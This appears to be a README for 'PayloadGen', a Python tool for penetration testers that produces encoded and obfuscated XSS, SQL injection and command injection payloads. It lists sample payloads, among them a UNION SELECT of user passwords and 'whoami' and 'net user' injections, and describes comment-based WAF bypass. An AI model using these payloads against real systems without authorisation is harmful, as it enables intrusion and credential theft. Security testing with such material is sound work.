# 🚀 PayloadGen – Web Payload Generator Tool

A modular offensive security tool to generate, encode, obfuscate, and export web attack payloads like **XSS**, **SQL Injection**, and **Command Injection**. Perfect for security researchers, penetration testers, and CTF enthusiasts.

---

## ✨ Features

- 🔍 Payload generation for:
  - Cross-Site Scripting (XSS)
  - SQL Injection (SQLi)
  - Command Injection (CMDi)
- 🔐 Encode payloads:
  - URL encoding
  - Base64
  - Hexadecimal
  - Unicode escape
- 🛡️ Obfuscate payloads using comment injection (`/**/`)
- 📋 Copy payloads directly to clipboard (`--clip`)
- 📄 Export payloads to structured `output.json`
- 🧩 Fully modular and extensible codebase
- 🐧 Works on Kali Linux, Parrot OS, and any Linux with Python 3

---

## 🔧 Usage Examples

\`\`\`bash
# Basic payload generation
python3 main.py --xss
python3 main.py --sqli
python3 main.py --cmd

# Encode payloads
python3 main.py --xss --encode=url
python3 main.py --sqli --encode=base64
python3 main.py --cmd --encode=unicode

# Obfuscate payloads
python3 main.py --xss --obfuscate

# Encode + Obfuscate + Export
python3 main.py --cmd --encode=hex --obfuscate --export

# Copy first payload to clipboard
python3 main.py --xss --clip
\`\`\`

---

## 🐍 Requirements

- Python 3.7+
- Install dependencies safely in a virtual environment:

\`\`\`bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
\`\`\`

Content of \`requirements.txt\`:
\`\`\`
pyperclip
\`\`\`

---

## 🧪 Payload Samples

### XSS Payloads:
- \`<script>alert(1)</script>\`
- \`<img src=x onerror=alert(1)>\`
- \`javascript:alert(1)\`
- \`<svg/onload=alert(1)>\`
- \`<iframe srcdoc="<script>alert(1)</script>">\`
- \`<script%00>alert(1)</script>\`

### SQL Injection Payloads:
- \`' UNION SELECT null, username, password FROM users--\`
- \`' OR 1=1 ORDER BY 100--\`
- \`' AND SLEEP(5)--\`
- \`'/**/UNION/**/SELECT/**/NULL--\`
- \`' uNIoN SeLEct null--\`

### Command Injection Payloads:
- \`;ls\`
- \`&& whoami\`
- \`\` \`id\` \`\`
- \`& whoami\` (Windows)
- \`| net user\` (Windows)

---

## 💡 Encoding Types

| Method     | Result Example                        |
|------------|----------------------------------------|
| \`url\`      | %3Cscript%3Ealert(1)%3C%2Fscript%3E     |
| \`base64\`   | PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==    |
| \`hex\`      | 0x3c0x730x630x720x690x700x740x3e...     |
| \`unicode\`  | \\u003c\\u0073\\u0063\\u0072...         |

---

## 🔐 Obfuscation Support

Obfuscates spaces using inline comments (\`/**/\`) for WAF bypass:

\`\`\`bash
python3 main.py --sqli --obfuscate
\`\`\`

Result:
\`\`\`
SELECT/**//*/*/**/FROM/**/users
\`\`\`

---

## 📂 Output Formats

| Output Type  | Description                                |
|--------------|--------------------------------------------|
| Terminal     | Default payload listing                    |
| Clipboard    | First payload copied with \`--clip\`         |
| File         | JSON output saved with \`--export\`          |
| Screenshot   | (optional) for GUI demo or reports         |


## 👨‍💻 Author

- **Ubaidullah Qureshi**


